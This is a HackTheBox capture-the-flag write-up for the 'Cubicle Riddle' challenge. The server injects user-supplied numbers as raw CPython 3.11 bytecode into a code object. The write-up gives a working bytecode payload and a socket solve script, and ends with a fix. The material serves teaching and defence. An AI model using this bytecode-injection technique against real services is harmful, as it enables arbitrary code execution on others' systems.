---
title: "Cubicle Riddle"
date: 2027-11-28 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, python, bytecode, code-injection, cpython, cwe-94]
description: "An Easy Misc challenge that disguises raw CPython bytecode injection as a riddle: your comma-separated 'answer' becomes the body of a hand-built code object, so you write a min/max loop in raw 3.11 opcodes to win."
---

## Overview

**Cubicle Riddle** is an Easy HackTheBox **Misc** challenge. A TCP service tells a riddle —
*"the lowest low, the highest grand"* (the min and max of an array) — and asks you to answer
with a comma-separated list of integers. The twist: those integers are not a guess. They are
**raw CPython bytecode** that gets spliced into the middle of a hand-built code object and
executed. The whole challenge is a disguised [CWE-94](https://cwe.mitre.org/data/definitions/94.html)
**code injection**: write a `min`/`max` loop in raw 3.11 opcodes and the cube hands you the flag.

## The technique

The server builds a code object by hand and stuffs your bytes into the middle of it:

```python
# riddler.py
co_code_start = b"d\x01}\x01d\x02}\x02"   # LOAD_CONST 1000 -> min ; LOAD_CONST -1000 -> max
co_code_end   = b"|\x01|\x02f\x02S\x00"   # LOAD_FAST min ; LOAD_FAST max ; BUILD_TUPLE 2 ; RETURN_VALUE

def _construct_answer(self, answer: bytes):
    co_code = bytearray(self.co_code_start) + answer + self.co_code_end   # <-- INJECTION
    return types.CodeType(1, 0, 0, 4, 3, 3, bytes(co_code),
        (None, 1000, -1000), (), ("num_list", "min", "max", "num"), ...)

def check_answer(self, answer):
    f = types.FunctionType(self._construct_answer(answer), {})            # {} globals -> NO builtins
    return f(self.num_list) == (min(self.num_list), max(self.num_list))   # equal real min/max -> flag
```

We control only the **middle**. The prologue seeds `min = 1000` and `max = -1000`; the epilogue
returns `(min, max)`. Our injected bytecode must iterate `num_list` and update `min`/`max`.

The "sandbox" is the empty globals dict `{}` passed to `FunctionType` — and it is not much of a
sandbox. It blocks **builtins** (no `min()`, `max()`, `sorted()`, `eval`, `__import__`; `co_names`
is empty too), but it does nothing about raw **stack and loop opcodes**. So we just write the
comparison loop ourselves in bytecode.

## Solution

We need to inject the equivalent of:

```python
for num in num_list:
    if num < min: min = num
    if num > max: max = num
```

Assembled as CPython 3.11 bytecode (`num` is the loop local):

```
LOAD_FAST num_list ; GET_ITER
FOR_ITER  -> after-loop
    STORE_FAST num
    LOAD_FAST num ; LOAD_FAST min ; COMPARE_OP '<' ; CACHE ; CACHE
    POP_JUMP_FORWARD_IF_FALSE ; LOAD_FAST num ; STORE_FAST min
    LOAD_FAST num ; LOAD_FAST max ; COMPARE_OP '>' ; CACHE ; CACHE
    POP_JUMP_FORWARD_IF_FALSE ; LOAD_FAST num ; STORE_FAST max
    JUMP_BACKWARD -> FOR_ITER
```

**The gotcha that bites everyone.** In CPython 3.11, `COMPARE_OP` carries **two inline-cache
code-units** (4 bytes of `0x00`) immediately after it. Forget them and the following
`POP_JUMP_FORWARD_IF_FALSE` gets read as cache — the interpreter then executes garbage and
**segfaults** (exit 139). Also, 3.11 jump arguments are **relative**, counted in **code units**
(2 bytes), measured from the instruction *after* the jump. Opcode numbers and cache sizes differ
across 3.10/3.11/3.12/3.13, so you must validate against the **same** interpreter the server runs.

Build the exact `types.CodeType`, disassemble it, and run it on random inputs before sending.
When your local Python differs from the target's (here Kali shipped 3.13, the server was 3.11.4),
a matching container does the job:

```sh
docker run --rm -v ./validate.py:/v.py:ro python:3.11-slim python -u /v.py
```

`solve.py` — connects, approaches the cube, and sends the bytecode answer:

```python
import socket, sys

# CPython 3.11 min/max loop, comma-decimal bytes (validated on python:3.11)
PAYLOAD = "124,0,68,0,93,18,125,3,124,3,124,1,107,0,0,0,0,0,114,2,124,3,125,1,124,3,124,2,107,4,0,0,0,0,114,2,124,3,125,2,140,19"

def main(host, port):
    s = socket.create_connection((host, int(port)), timeout=15)
    def rx():
        s.settimeout(4); out = b""
        try:
            while True:
                d = s.recv(4096)
                if not d: break
                out += d
        except socket.timeout:
            pass
        return out
    print(rx().decode(errors="replace"))      # forest banner
    s.sendall(b"1\n")                          # approach the cube
    print(rx().decode(errors="replace"))       # riddle prompt
    s.sendall(PAYLOAD.encode() + b"\n")        # injected bytecode
    final = rx().decode(errors="replace")
    print(final)
    for line in final.splitlines():
        if "HTB{" in line:
            i = line.find("HTB{"); print("FLAG:", line[i:line.find('}', i)+1])
    s.close()

if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2])
```

```sh
python3 solve.py <host> <port>
# ... A resonant voice echoes through the woods that says... HTB{...}
```

The cube answers the riddle correctly and reveals the flag (`HTB{...}` — redacted).

## Why it worked

The application treats untrusted input as executable code with zero validation — textbook
[code injection](https://cwe.mitre.org/data/definitions/94.html). The only barrier, an empty
globals dict, stops builtins but not the raw stack/loop opcodes you need to compute `min`/`max`
by hand. Once you can place arbitrary bytecode inside a running code object, the "answer check"
is just a function you've authored.

## Fix / defense

Never construct a `types.CodeType` (or call `compile`/`eval`/`exec`) from user-supplied bytes.
Parse the answer as **data** and compare it against the expected result in ordinary Python:

```python
nums = [int(x) for x in answer.split(",")]
if (min(num_list), max(num_list)) == (min(nums), max(nums)):   # data, never code
    ...
```
